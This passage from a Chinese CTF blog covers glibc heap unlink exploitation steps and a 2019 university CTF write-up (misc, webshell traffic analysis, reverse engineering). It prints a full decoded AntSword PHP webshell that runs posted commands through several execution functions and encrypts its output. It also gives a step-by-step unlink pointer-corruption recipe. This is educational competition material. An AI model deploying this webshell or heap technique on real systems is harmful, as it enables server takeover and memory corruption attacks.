<li><code>fakeBK -&gt; fd = fakeFD</code>  &lt;=&gt;  <code>*(fakeBK + 8) = fakeFD</code></li>
</ul>
<p>如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么：</p>
<ul>
<li><code>*P = P - 8</code></li>
<li><code>*P = P - 12</code></li>
</ul>
<p>即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。</p>
<p>需要注意的是，这里我们并没有违背下面的约束，因为 P 在 Unlink 前是指向正确的 chunk 的指针。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span><br><span class="line">if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span><br><span class="line">  malloc_printerr (&quot;corrupted size vs. prev_size&quot;);               \</span><br></pre></td></tr></table></figure>

<p><strong>此外，其实如果我们设置 next chunk 的 fd 和 bk 均为 nextchunk 的地址也是可以绕过上面的检测的。但是这样的话，并不能达到修改指针内容的效果</strong></p>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol>
<li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li>
<li>已知位置存在一个指针指向可进行 UAF 的 chunk</li>
</ol>
<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>设指向可 UAF chunk 的指针的地址为 ptr</p>
<ol>
<li>修改 fd 为 ptr - 0x18</li>
<li>修改 bk 为 ptr - 0x10</li>
<li>触发 unlink</li>
</ol>
<p>ptr 处的指针会变为 ptr - 0x18</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/21/2019╕▀╨ú╘╦╬¼╚ⁿWriteUp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/11/21/2019╕▀╨ú╘╦╬¼╚ⁿWriteUp/" class="post-title-link" itemprop="url">2019高校运维赛WriteUp</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-11-21 07:16:37 / Modified: 23:16:54" itemprop="dateCreated datePublished" datetime="2019-11-21T07:16:37-08:00">2019-11-21</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="0x01-misc1"><a href="#0x01-misc1" class="headerlink" title="0x01 misc1"></a>0x01 misc1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">'724c6e962216407fa5fa1ad7efda2653_misc1_flag.txt'</span>,<span class="string">'rb'</span>)</span><br><span class="line">b = f.read()</span><br><span class="line">a = []</span><br><span class="line">max = int(<span class="number">0</span>)</span><br><span class="line">min = int(<span class="number">999</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    t = i</span><br><span class="line">    <span class="keyword">if</span> t &gt;= max:</span><br><span class="line">        max = i</span><br><span class="line">    <span class="keyword">if</span> t &lt;= min:</span><br><span class="line">        min = i</span><br><span class="line">    a.append(hex(i))</span><br><span class="line">print(hex(max))</span><br><span class="line">print(hex(min))</span><br></pre></td></tr></table></figure>

<p>导出数据观察可以发现最小值为0x2，最大值为0xF9，根据判断可见字符在这个范围内的应该为EBCDIC编码，且是CP1146（IBM EBCDIC英国编码）<br>可以编写解码脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> ebcdic</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> codecs.open(<span class="string">"724c6e962216407fa5fa1ad7efda2653_misc1_flag.txt"</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> input_file:</span><br><span class="line">        print(input_file.read().decode(<span class="string">'cp1146'</span>))</span><br><span class="line">decode()</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ñBuCðCx:¦@B©B£BvC·BðB¯BlB¾$EBCDIC: /eb´s@·dik/, /eb´see`dik/, /eb´k@·dik/, n. [abbreviation, Extended Binary Coded Decimal Interchange Code] An alleged character set used on IBM dinosaurs. It exists in at least six mutually incompatible versions, all featuring such delights as non-contiguous letter sequences and the absence of several ASCII punctuation characters fairly important for modern computer languages (exactly which characters are absent varies according to which version of EBCDIC you&apos;re looking at). IBM adapted EBCDIC from punched card code in the early 1960s and promulgated it as a customer-control tactic (see connector conspiracy), spurning the already established ASCII standard. Today, IBM claims to be an open-systems company, but IBM&apos;s own description of the EBCDIC variants and how to convert between them is still internally classified top-secret, burn-before-reading. Hackers blanch at the very name of EBCDIC and consider it a manifestation of purest evil.flag is flag&#123;0a07c11e46af753fd24d40023f0fdce1&#125;</span><br></pre></td></tr></table></figure>

<p>最简单的方法是使用WPS Word打开文件，文件 -&gt; 文件 -&gt; 重新载入 -&gt; IBM EBCDIC英国编码</p>
<h2 id="0x02-misc2"><a href="#0x02-misc2" class="headerlink" title="0x02 misc2"></a>0x02 misc2</h2><p>111.186.57.61:10701</p>
<p>任意文件读取<br>读取/proc/self/fd/3 得到flag</p>
<h2 id="0x02-misc3"><a href="#0x02-misc3" class="headerlink" title="0x02 misc3"></a>0x02 misc3</h2><p>使用010editor等十六进制编辑器打开html文件，可看见存在一段由序列<code>E2 80 8C</code>和序列<code>E2 80 8B</code>组成的隐藏字符，把<code>E2 80 8C</code>视为<code>0</code>，<code>E2 80 8B</code>视为<code>1</code>进行转换可得flag<br>在Chrome浏览器的开发者工具中打开也可以发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0827h: E2 80 8C E2 80 8B E2 80 8B E2 80 8C E2 80 8C E2  â€Œâ€‹â€‹â€Œâ€Œâ </span><br><span class="line">0837h: 80 8B E2 80 8B E2 80 8C E2 80 8C E2 80 8B E2 80  €‹â€‹â€Œâ€Œâ€‹â€ </span><br><span class="line">0847h: 8B E2 80 8C E2 80 8B E2 80 8B E2 80 8C E2 80 8C  ‹â€Œâ€‹â€‹â€Œâ€Œ </span><br><span class="line">0857h: E2 80 8C E2 80 8B E2 80 8B E2 80 8C E2 80 8C E2  â€Œâ€‹â€‹â€Œâ€Œâ </span><br><span class="line">0867h: 80 8C E2 80 8C E2 80 8B E2 80 8C E2 80 8B E2 80  €Œâ€Œâ€‹â€Œâ€‹â€ </span><br><span class="line">0877h: 8B E2 80 8C E2 80 8C E2 80 8B E2 80 8B E2 80 8B  ‹â€Œâ€Œâ€‹â€‹â€‹ </span><br><span class="line">0887h: E2 80 8C E2 80 8B E2 80 8B E2 80 8B E2 80 8B E2  â€Œâ€‹â€‹â€‹â€‹â </span><br><span class="line">0897h: 80 8C E2 80 8B E2 80 8B E2 80 8C E2 80 8B E2 80  €Œâ€‹â€‹â€Œâ€‹â€ </span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0000h: 01100110 01101100 01100001 01100111 01111011 01100101 00110010 01100001  flag&#123;e2a </span><br><span class="line">0008h: 00111001 01100011 00111000 01100010 00110001 00110001 00110111 00110101  9c8b1175 </span><br><span class="line">0010h: 01100101 00110110 00110110 01100011 01100110 00110010 00110001 01100110  e66cf21f </span><br><span class="line">0018h: 00111000 00110101 00111001 00110011 01100010 01100011 00111000 00110101  8593bc85 </span><br><span class="line">0020h: 01100010 01100110 00111001 00110011 00111001 01111101                    bf939&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x03-webshell"><a href="#0x03-webshell" class="headerlink" title="0x03 webshell"></a>0x03 webshell</h2><p>分析流量可知，在服务器上执行的shell解密后大致如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span><span class="params">($out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @session_start();</span><br><span class="line">    $key = <span class="string">'f5045b05abe6ec9b1e37fafa851f5de9'</span>;</span><br><span class="line">    <span class="keyword">return</span> @base64_encode(openssl_encrypt(base64_encode($out), <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $output = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"8c2b4"</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc($output);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"e2e10"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $p = base64_decode($_POST[<span class="string">"0x1b4d456c7297d"</span>]);</span><br><span class="line">    $s = base64_decode($_POST[<span class="string">"0xb9b45688a5a08"</span>]);</span><br><span class="line">    $d = dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line">    $c = substr($d, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"/"</span> ? <span class="string">"-c \"&#123;$s&#125;\""</span> : <span class="string">"/c \"&#123;$s&#125;\""</span>;</span><br><span class="line">    $r = <span class="string">"&#123;$p&#125; &#123;$c&#125;"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fe</span><span class="params">($f)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $d = explode(<span class="string">","</span>, @ini_get(<span class="string">"disable_functions"</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($d)) &#123;</span><br><span class="line">            $d = <span class="keyword">array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $d = array_map(<span class="string">'trim'</span>, array_map(<span class="string">'strtolower'</span>, $d));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (function_exists($f) &amp;&amp; is_callable($f) &amp;&amp; !in_array($f, $d));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runcmd</span><span class="params">($c)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (fe(<span class="string">'system'</span>)) &#123;</span><br><span class="line">            @system($c, $ret);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">'passthru'</span>)) &#123;</span><br><span class="line">            @passthru($c, $ret);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">'shell_exec'</span>)) &#123;</span><br><span class="line">            <span class="keyword">print</span>(@shell_exec($c));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">'exec'</span>)) &#123;</span><br><span class="line">            @exec($c, $o, $ret);</span><br><span class="line">            <span class="keyword">print</span>(join(<span class="string">"</span></span><br><span class="line"><span class="string">"</span>, $o));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">'popen'</span>)) &#123;</span><br><span class="line">            $fp = @popen($c, <span class="string">'r'</span>);</span><br><span class="line">            <span class="keyword">while</span> (!@feof($fp)) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets($fp, <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @pclose($fp);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">'antsystem'</span>)) &#123;</span><br><span class="line">            @antsystem($c);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $ret = <span class="number">127</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    $ret = @runcmd($r . <span class="string">" 2&gt;&amp;1"</span>);</span><br><span class="line">    <span class="keyword">print</span> ($ret != <span class="number">0</span>) ? <span class="string">"ret=&#123;$ret&#125;"</span> : <span class="string">""</span>;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ERROR://"</span> . $e-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//ed3edq113</span></span><br></pre></td></tr></table></figure>

<p>在第七个HTTP流中，读取了flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [4]: base64.b64decode(&apos;Y2QgIi92YXIvd3d3L2h0bWwvdG1wIjtjYXQgZmxhZ3xiYXNlNjQgO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXQ==&apos;)</span><br><span class="line">Out[4]: b&apos;cd &quot;/var/www/html/tmp&quot;;cat flag|base64 ;echo [S];pwd;echo [E]&apos;</span><br></pre></td></tr></table></figure>

<p>flag经过了一层base64加密，在asoutput方法中增加了前后缀，然后在套一下base64，顺便AES加密<br>响应的内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kRD1eD+vSZ81FAJ6XClabCR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dZOTFg4DW9MYwG6k3rEvAAR8oFStGnfMRtUJOqc0mgokfKBUrRp3zEbVCTqnNJoKJHygVK0ad8xG1Qk6pzSaCiR8oFStGnfMRtUJOqc0mgokfKBUrRp3zEbVCTqnNJoKJ1qI47Cz1/qfnNoNARGhLfVhC0RJlfeKCvbPwpjFn//BSFY8RJlZyxz1a+TPy0D3cUhWPESZWcsc9Wvkz8tA93FIVjxEmVnLHPVr5M/LQPdxSFY8RJlZyxz1a+TPy0D3cUhWPESZWcsc9Wvkz8tA93GnMvJfVbvphfWnt17IOkzYjvv91k2fnYDR7u4nlGM3YitxGYGs9mn+HS5iJBXORtYrcRmBrPZp/h0uYiQVzkbWK3EZgaz2af4dLmIkFc5G1itxGYGs9mn+HS5iJBXORtUq4dBjDRFhDqDyzs9CScJhrd3yMusQ+qsnZkq4Ey7NVJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l2hDPuDhVN4TaDLzp9bXyfGeCVhvglAaNo2rA/ovnRTTtfA5ZywMOOijj6md5RItqjXwOWcsDDjoo4+pneUSLao18DlnLAw46KOPqZ3lEi2qNfA5ZywMOOijj6md5RItqgS0b9hS7r5TX9YNZo2awgUAyqVacVgwr1NlNQ2k/kihhh0QQfnjeGdZhkz0N0jAKiMzFmAMa7xQ1URxTaHoHjDg3NaWl/8+PVG+pyaKrbNDjfl77POeQE8+0MCHpz6YxWLJ6mwCe1X3uzz/HSHcHSvQBB8FxjOhugOErOXkd3LZi/60Gr4gIEc1JIxA5A2pE/V6Z/DFwNOR4M/IIIWdGr5</span><br></pre></td></tr></table></figure>

<p>解密脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$r=file_get_contents(<span class="string">"enc"</span>);</span><br><span class="line">$key = <span class="string">'f5045b05abe6ec9b1e37fafa851f5de9'</span>;</span><br><span class="line"><span class="keyword">echo</span> openssl_decrypt(base64_decode($r), <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>拿到flag:<strong>flag{AntSword_is_Powerful_3222222!!!!}</strong></p>
<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p><code>init_array</code>和<code>fini_array</code>都有一个函数，在<code>init_array</code>里的函数里加了反调，直接<code>patch</code>即可，然后还把<code>key</code>修改了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      result = aThisIsNotKey;</span><br><span class="line">      aThisIsNotKey[j] ^= <span class="number">7u</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>然后<code>fini_array</code>才是最后的比较函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> __int8)byte_202040[i + <span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">if</span> ( byte_2020E0[i] != (_BYTE)result )</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>加密函数是RC4算法，解题脚本为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line">key = <span class="string">"sontXntXihsXlb~&amp;"</span></span><br><span class="line">data = <span class="string">"A"</span>*<span class="number">0x10</span></span><br><span class="line">rc41 = ARC4.new(key)</span><br><span class="line"><span class="comment"># part1 = rc41.decrypt('78695a5c2515935f6d150711ee01b3ab'.decode('hex'))</span></span><br><span class="line">part2 = rc41.decrypt(<span class="string">'7f305e5f1619bf7471131025d75fe1ff'</span>.decode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> part2</span><br></pre></td></tr></table></figure>

<h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>32元一次方程组,把数据扣出来在到在线网站上解密（</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import re</span></span><br><span class="line"><span class="comment"># a = ''' 17153 * a1[27]</span></span><br><span class="line"><span class="comment"># + 41549 * a1[26]</span></span><br><span class="line"><span class="comment"># + 28202 * a1[24]</span></span><br><span class="line"><span class="comment"># + 36806 * a1[23]</span></span><br><span class="line"><span class="comment"># + 12690 * a1[22]</span></span><br><span class="line"><span class="comment"># + 42821 * a1[20]</span></span><br><span class="line"><span class="comment"># + 39834 * a1[19]</span></span><br><span class="line"><span class="comment"># + 17994 * a1[17]</span></span><br><span class="line"><span class="comment"># + 32765 * a1[14]</span></span><br><span class="line"><span class="comment"># + 25687 * a1[10]</span></span><br><span class="line"><span class="comment"># + 33388 * a1[9]</span></span><br><span class="line"><span class="comment"># + 143 * a1[4]</span></span><br><span class="line"><span class="comment"># + 63776 * a1[0]</span></span><br><span class="line"><span class="comment"># + 8682 * a1[1]</span></span><br><span class="line"><span class="comment"># - 16324 * a1[2]</span></span><br><span class="line"><span class="comment"># - 20022 * a1[3]</span></span><br><span class="line"><span class="comment"># - 48973 * a1[5]</span></span><br><span class="line"><span class="comment"># - 57775 * a1[6]</span></span><br><span class="line"><span class="comment"># - 43820 * a1[7]</span></span><br><span class="line"><span class="comment"># - 41070 * a1[8]</span></span><br><span class="line"><span class="comment"># - 15669 * a1[11]</span></span><br><span class="line"><span class="comment"># - 6946 * a1[12]</span></span><br><span class="line"><span class="comment"># - 23187 * a1[13]</span></span><br><span class="line"><span class="comment"># - 46495 * a1[15]</span></span><br><span class="line"><span class="comment"># - 8395 * a1[16]</span></span><br><span class="line"><span class="comment"># - 27782 * a1[18]</span></span><br><span class="line"><span class="comment"># - 46043 * a1[21]</span></span><br><span class="line"><span class="comment"># - 15428 * a1[25]</span></span><br><span class="line"><span class="comment"># - 59010 * a1[28]</span></span><br><span class="line"><span class="comment"># - 49235 * a1[29]</span></span><br><span class="line"><span class="comment"># - 53666 * a1[30]</span></span><br><span class="line"><span class="comment"># + 28539 * a1[31] == -15479857 '''</span></span><br><span class="line"><span class="comment"># a = a.replace("a1","").split("\n")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># matrix = [0 for i in range(32)]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(32):</span></span><br><span class="line">	<span class="comment"># f = re.search("([+-]?) ([0-9]*)",a[i]).groups()[0]</span></span><br><span class="line">	<span class="comment"># value = int(re.search("([+-]?) ([0-9]*)",a[i]).groups()[1])</span></span><br><span class="line">	<span class="comment"># if f != '':</span></span><br><span class="line">		<span class="comment"># if f == '-':</span></span><br><span class="line">			<span class="comment"># value = -1*value</span></span><br><span class="line">		<span class="comment"># else:</span></span><br><span class="line">			<span class="comment"># pass</span></span><br><span class="line">	<span class="comment"># idx = int(a[i][a[i].find('[')+1:a[i].find(']')])</span></span><br><span class="line">	<span class="comment"># matrix[idx] = value</span></span><br><span class="line"><span class="comment"># m = ''</span></span><br><span class="line"><span class="comment"># for i in matrix:</span></span><br><span class="line">	<span class="comment"># m += str(i)+','</span></span><br><span class="line"><span class="comment"># m = m.strip(',')</span></span><br><span class="line"><span class="comment"># print m</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># http://www.yunsuan.info/matrixcomputations/solvelinearsystems.html</span></span><br><span class="line"><span class="comment"># 44493,-326,-57451,-18424,22432,45266,20069,47551,-3751,39591,35081,45204,-6984,-9410,-54261,2139,48734,-62111,44970,29470,-20305,-33120,39390,1513,58180,-11160,-24198,37157,50244,-1646,37027,-13318</span></span><br><span class="line"><span class="comment"># -54741,-3606,48560,-45416,22008,11900,-24275,-64371,32499,46114,-25714,21730,-56673,9624,28702,-39430,9187,-35779,26720,-15144,51548,11260,48594,-45050,-59016,50109,-29262,-55650,-29492,-13828,12535,40522</span></span><br><span class="line"><span class="comment"># 